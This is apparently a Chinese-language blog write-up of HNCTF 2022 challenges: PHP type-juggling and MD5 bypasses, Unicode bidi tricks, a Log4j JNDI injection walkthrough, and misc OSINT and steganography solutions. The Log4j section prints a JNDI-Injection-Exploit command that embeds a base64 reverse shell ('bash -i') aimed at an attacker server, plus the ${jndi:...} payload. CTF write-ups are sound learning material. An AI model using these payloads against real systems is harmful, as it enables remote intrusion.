---
title: HNCTF 2022
date: 2023/5/31 19:48:25
categories:
- CTF
tags:
- HNCTF
---



## web

### [HNCTF 2022 WEEK3]Fun_php

```php
$getUserID = @$_GET['user']; 
$getpass = (int)@$_GET['pass']; 
$getmySaid = @$_GET['mySaid']; 
$getmyHeart = @$_GET['myHeart']; 

$data = @$_POST['data'];
$verify =@$_POST['verify'];
$want = @$_POST['want'];
$final = @$_POST['final'];
```

```php
if(is_string($getUserID))
    $user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r

if($user == 114514 && $getpass == $pass){
    if (!ctype_alpha($getmySaid)) 
        die();
    if (!is_numeric($getmyHeart)) 
        die();
    if(md5($getmySaid) != md5($getmyHeart)){
        die("Cheater!");
    }
    else
        $week_1 = true;
}
```

- 字符串与数字弱比较

  > u5er_D0_n0t_b3g1n_with_4_numb3r

  ```php
  'sdasd114514' ==  114514
      
  get --> user=114514
  ```

- 猜测$pass为字符串

  ```php
  'dbasdha' == 0 //True
  
  get --> pass=0
  ```

- 字符串与数字MD5相等

  科学计数法绕过  **0e开头的数字字符串**

  ```php
  s214587387a
     
  1586264293
  ```

  

  

  ```php
  if(is_array($data)){
      for($i=0;$i<count($data);$i++){
  
          if($data[$i]==="Probius") exit();
  
          $data[$i]=intval($data[$i]);
      }
      if(array_search("Probius",$data)===0)
          $week_2 = true;
  
      else
          die("HACK!");
  }
  ```

  array_search默认弱比较查找,返回查找成功元素的下标

  ```php
  post --> data[]=0
  ```

  

  

  ```php
  if($week_1 && $week_2){
      if(md5($data)===md5($verify))
          // ‮⁦HNCTF⁩⁦Welcome to
          if ("hn" == $_GET['hn'] &‮⁦+!!⁩⁦& "‮⁦ Flag!⁩⁦ctf" == $_GET[‮⁦LAG⁩⁦ctf]) { //HN! flag!! F
          
              if(preg_match("/php|\fl4g|\\$|'|\"/i",$want)Or is_file($want))
                  die("HACK!");
         
                  else{
                      echo "Fine!you win";
                      system("cat ./$want");
                   }
      }
      else
          die("HACK!");
  }
  ```

  md5弱比较，数组绕过

  ```php
  post --> data[]=0&verify[]=1
  ```

  ![image-20221101183032110](../images/image-20221101183032110-1686150252660.png)

  零宽度隐写，？？？？

  ```php
  get --> 
      
  hn=hn&%E2%80%AE%E2%81%A6LAG%E2%81%A9%E2%81%A6ctf=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6ctf
  ```

  

```php
  if(preg_match("/php|\fl4g|\\$|'|\"/i",$want)Or is_file($want))
```

通配符绕过

```php
  post --> want=f*
```





### [HNCTF 2022 WEEK3]logjjjjlogjjjj

复现：https://blog.csdn.net/weixin_47179815/article/details/125654828

本地环境：JDK版本1.8

攻击流程

- 服务器运行攻击脚本生成payload

  ```
  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64(反弹shell)}|{base64,-d}|{bash,-i}" -A 服务器ip
  ```

![image-20221101211620970](../images/image-20221101211620970-1686150252661.png)

- 服务器监听端口

- 发送payload

  ```java
  ${jndi:xxx://xxxx/xxx}
  将上面生成的payload放入（优先JDK）
  ```

  URL编码后发送请求

  ![image-20221101211959222](../images/image-20221101211959222-1686150252662.png)

成功连接

<img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" />











## misc

### 简单编码

图片尾部有一串url编码后的字符

![image-20221102000004428](../images/image-20221102000004428-1686150252663.png)

### [HNCTF 2022 Week1]线下单杀出题人（OSINT)

![image-20221101232202282](../images/image-20221101232202282-1686150252663.png)

首先从A图片中提取出经纬度

![image-20221101232242899](../images/image-20221101232242899-1686150252663.png)



因为这个经纬度是度分秒的形式，需要先转换为度数形式

格式转换：http://www.gzhatu.com/du2dfm.html

定位：http://www.gzhatu.com/dingwei.html

![image-20221101232434815](../images/image-20221101232434815-1686150252663.png)

A图片中还有一个提示

![image-20221101232718045](../images/image-20221101232718045-1686150252663.png)

所以可以确定定位是正确的。

然后根据第二张图中的河流可以知道是往哪条路走的。

<img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" />

用高德地图定位嘉兴电信大厦，往那条路找，找到

<img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" />

flag

```python
from hashlib import md5

print(md5('嘉兴市南湖区禾兴北路506号亚芬汀精品酒店'.encode('utf-8')).hexdigest())#utf-8编码
```

SSCTF{f833a4d17d35ca5da40f087950293d04}



也可以用exif工具查看

<img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" />



### [HNCTF 2022 Week1\]三生三世

弱密码爆破，图片base64隐写得到二维码，扫描后用栅栏密码解密，每组字数为3.

### [HNCTF 2022 Week1]silly_zip

伪加密+IHDR修改

### [HNCTF 2022 Week1]piz.galf

两次逆序

```python
f = open(r"C:\Users\khaz\Downloads\pmb.galf" , 'rb' ).read()
f2 = open(r"C:\Users\khaz\Downloads\flag.bmp" , "wb")
f2.write(f[ ::-1])
```















































































